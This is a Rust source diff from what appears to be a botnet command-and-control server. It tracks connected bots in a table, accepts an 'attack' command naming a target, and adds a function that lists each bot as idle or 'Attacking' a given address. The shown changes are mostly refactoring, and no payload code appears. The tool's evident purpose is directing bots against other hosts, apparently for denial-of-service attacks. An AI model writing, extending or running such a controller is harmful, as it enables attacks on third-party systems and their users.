@@ -3,7 +3,6 @@ use std::{
 };
 
 use astolfo::FemState;
-use bincode::Encode;
 use tokio::{
     io::{self, AsyncBufReadExt, AsyncReadExt, AsyncWriteExt, BufReader},
     net::{TcpListener, TcpStream},
@@ -32,7 +31,7 @@ async fn main() {
 
     let listen_femtable = Arc::clone(&femtable);
 
-    let listen_task = tokio::spawn(async move {
+    tokio::spawn(async move {
         let listener = TcpListener::bind(format!("0.0.0.0:{port}"))
             .await
             .unwrap_or_else(|err| {
@@ -70,7 +69,7 @@ async fn main() {
 
     let command_femtable = Arc::clone(&femtable);
 
-    let command_task = tokio::spawn(async move {
+    tokio::spawn(async move {
         let mut stdin = BufReader::new(io::stdin());
         let mut buf = String::new();
         loop {
@@ -91,7 +90,7 @@ async fn main() {
                     process::exit(1);
                 });
 
-                println!("{femtable:?}");
+                display_table(&*femtable);
             }
             else if command == "attack" {
                 let target = command_string.next();
@@ -123,7 +122,7 @@ async fn main() {
             buf.clear();
         }
     })
-    .await;
+    .await.ok();
 }
 
 async fn handle_femboy(femtable: BotTable, addr: SocketAddr, mut stream: TcpStream) {
@@ -165,5 +164,15 @@ async fn handle_femboy(femtable: BotTable, addr: SocketAddr, mut stream: TcpStre
             })
         }
 
+    }
+}
+
+fn display_table(femtable: &HashMap<SocketAddr, Femboy>) {
+    for (k,v) in femtable.iter() {
+        match v.state {
+            FemState::Idle => println!("\x1b[92m●\x1b[0m {k} Idle"),
+            FemState::Attacking(ref addr) => println!("\x1b[91m●\x1b[0m {k} Attacking -> {addr}"),
+            _ => {}
+        }
     }
 }
